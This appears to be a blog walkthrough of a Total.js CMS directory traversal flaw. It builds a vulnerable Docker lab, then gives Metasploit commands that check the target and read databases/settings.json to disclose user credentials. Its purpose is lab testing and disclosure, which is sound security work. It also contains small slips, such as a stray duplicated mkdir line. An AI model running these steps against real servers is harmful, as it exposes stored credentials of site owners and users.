---
layout: default
---

# Total.js Directory Traversal: try this at home

[Total.js](https://www.totaljs.com) is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.

Affected versions of this framework are vulnerable to Directory Traversal. This attack, also known as Path Traversal, aims to access files and directories that are stored outside the intended folder.

Follows a Proof of Concept that exploit this vulnerable within the Total.js CMS in order to disclose users credentials.

## Labs setup
The most fashion and easy way to try the vulnerability is [docker](https://www.docker.com). With docker we setup a testing lab.

Create a directory where store image source.

```
root@kali:~# mkdir totaljs
```

cd into the new directory and download the Total.js CMS

```
root@kali:~# cd totaljs && git clone https://github.com/totaljs/cms.git
root@kali:~# mkdir totaljs
```
Then, create the `dockerfile` and open it with your favorite editor (e.g.: `nano dockerfile`). This file allow us to create an image from a node v8 image, install Total.js framework and copy the Total.js CMS in it:

```
FROM node:8
WORKDIR /home/node/totaljs
COPY cms/package*.json ./
RUN npm install
COPY cms/ .
RUN npm install total.js@3.2.2
EXPOSE 8000
CMD ["node","debug.js"]
```
Ok, now build the new image:

```
root@kali:~# docker build -t totaljs:3.2.2 .
```
When the build process finished, run a container with the totaljs image

```
root@kali:~# docker run -p 8322:8000 totaljs:3.2.2 --name totaljs-3.2.2
```

Now browse to [http://localhost:8322/](http://localhost:8322/).

## Exploiting the vuln!

In order to exploit the vulnerability, setting up the metasploit module as indicated in the [README.md](github.com/fabiocogno/metasploit-modules/README.md) file.

Start Metasploit console:

```
root@kali:~# msfconsole
```
When started, select the module:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > use auxiliary/scanner/http/totaljs_traversal
```
Now, set the host and the port to exploit

```
msf5 auxiliary(scanner/http/totaljs_traversal) > set rhost localhost
msf5 auxiliary(scanner/http/totaljs_traversal) > set rport 8322
```
The default `ACTION` is check that reveale if the host:port is vulnerable and than disclose the framework version and some other useful informations:
```
msf5 auxiliary(scanner/http/totaljs_traversal) > run
```
We can see an output like this one:

```
[*] Total.js version is: ^3.2.2
[*] App name: CMS
[*] App description: A simple and powerful CMS solution written in Total.js / Node.js.
[*] App version: 12.0.0
[*] Auxiliary module execution completed
```
Ok, our total.js testing container is vulnerable and the framework version is, strangely, 3.2.2..

As promised, we exploit this vulnerability in order to disclose the users credentials of the Total.js CMS. To do this, we can use the `READ` action:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > set action READ
```
And then set up the `databases/settings.json` and try to retrieve it from the CMS directory:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > set FILE databases/settings.json
FILE => databases/settings.json
msf5 auxiliary(scanner/http/totaljs_traversal) > run
```

## Thanks

Special thanks to Riccardo Krauter for the vulnerability discovery and Fabio Cogno for the module development.

